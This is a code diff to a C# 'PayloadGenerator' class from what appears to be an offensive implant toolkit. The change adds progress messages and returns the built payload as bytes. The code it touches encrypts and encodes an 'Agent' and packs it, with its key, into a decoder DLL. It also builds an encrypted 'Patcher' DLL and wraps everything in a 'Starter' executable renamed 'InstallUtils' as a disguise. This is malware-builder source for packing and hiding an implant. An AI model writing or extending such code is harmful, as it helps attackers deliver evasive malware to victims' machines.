@@ -13,6 +13,8 @@ public class PayloadGenerator
     public const string StarterSrcFile = "Starter.exe";
     public const string PatcherSrcFile = "PatcherDll.dll";
 
+    public event EventHandler<string> MessageSent;
+
     public string SourceDir { get; private set; }
 
     public PayloadGenerator(string sourceDir)
@@ -25,13 +27,20 @@ public class PayloadGenerator
         return Path.Combine(SourceDir, fileName);
     }
 
-    public void GeneratePayload(string outFile)
+    public byte[] GeneratePayload()
     {
-        Console.WriteLine("Generating encrypted Agent");
+        //Console.WriteLine("Generating encrypted Agent");
+
+        this.MessageSent?.Invoke(this, $"Configuring Agent...");
+
+        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
+
         string srcAgent = this.Source(AgentSrcFile);
         var encAgent = this.Encrypt(srcAgent);
         var agentb64 = this.Encode(encAgent.Encrypted);
 
+
+        this.MessageSent?.Invoke(this, $"Creating Decoder...");
         //Create DEcoder for agent
         var decDll = LoadAssembly(this.Source(DecoderSrcFile));
         decDll = AssemblyEditor.ReplaceRessources(decDll, new Dictionary<string, object>()
@@ -40,6 +49,8 @@ public class PayloadGenerator
             { "Key", encAgent.Secret }
         });
 
+
+        this.MessageSent?.Invoke(this, $"Creating Patcher...");
         //Create Patcher
         var patchDll = LoadAssembly(this.Source(PatcherSrcFile));
         patchDll = AssemblyEditor.ReplaceRessources(patchDll, new Dictionary<string, object>()
@@ -50,6 +61,7 @@ public class PayloadGenerator
         var encPatcher = this.Encrypt(patchDll);
         var patcherb64 = this.Encode(encPatcher.Encrypted);
 
+        this.MessageSent?.Invoke(this, $"Started...");
         //Create Starter
         var starter = LoadAssembly(this.Source(StarterSrcFile));
         starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
@@ -60,7 +72,7 @@ public class PayloadGenerator
 
         starter = AssemblyEditor.ChangeName(starter,"InstallUtils");
 
-        File.WriteAllBytes(outFile, starter);
+        return starter;
     }
 
     private byte[] LoadAssembly(string filePath)
